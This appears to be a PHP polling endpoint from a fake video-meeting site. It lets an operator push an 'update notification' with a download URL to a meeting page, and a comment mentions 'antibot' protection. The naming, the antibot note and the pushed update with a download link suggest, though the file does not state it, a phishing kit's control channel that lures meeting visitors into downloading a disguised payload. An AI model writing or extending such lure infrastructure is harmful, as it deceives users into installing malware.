<?php
// Event polling — update notification push.
// NOTE: Not antibot-protected (see api/signal.php for rationale).
// The POST branch requires either an admin session OR the meeting password,
// so it remains protected against abuse.
require_once dirname(__DIR__) . '/config.php';
header('Content-Type: application/json');
header('Cache-Control: no-store');
header('X-Robots-Tag: noindex, nofollow');

$m = preg_replace('/[^0-9\-]/', '', $_GET['m'] ?? $_POST['m'] ?? '');
if (!$m) { echo json_encode(['ok'=>false]); exit; }

// ── GET: poll for events (host/admin polls this) ───────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $evtFile  = zm_evt_file($m);
    $meetFile = zm_meet_file($m);

    $evt  = file_exists($evtFile)  ? zm_load($evtFile)  : [];
    $meet = file_exists($meetFile) ? zm_load($meetFile) : [];

    echo json_encode([
        'ok'          => true,
        'update_push' => $evt['update_push']  ?? false,
        'update_time' => $evt['update_time']  ?? null,
        'status'      => $meet['status']      ?? 'waiting',
        'host_email'  => $meet['host_email']  ?? null,
        'download_url'=> DOWNLOAD_URL,
    ]);
    exit;
}

// ── POST: admin pushes update notification ─────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Auth: accept either admin session OR meeting password (used by room.php)
    $authed = false;

    // Option 1: admin panel session
    session_start();
    if (!empty($_SESSION[ADMIN_KEY])) $authed = true;

    // Option 2: meeting password sent from room.php
    if (!$authed && $m && file_exists(zm_meet_file($m))) {
        $meetData = zm_load(zm_meet_file($m));
        $sentPass = $_POST['p'] ?? '';
        if ($sentPass !== '' && $sentPass === ($meetData['password'] ?? '')) {
            $authed = true;
        }
    }

    if (!$authed) {
        echo json_encode(['ok'=>false,'msg'=>'Unauthorized']); exit;
    }

    $action = $_POST['action'] ?? '';
    if ($action === 'push') {
        zm_save(zm_evt_file($m), ['update_push'=>true,'update_time'=>time()]);
        echo json_encode(['ok'=>true]);
    } elseif ($action === 'cancel') {
        zm_save(zm_evt_file($m), ['update_push'=>false,'update_time'=>null]);
        echo json_encode(['ok'=>true]);
    } else {
        echo json_encode(['ok'=>false]);
    }
    exit;
}

echo json_encode(['ok'=>false]);
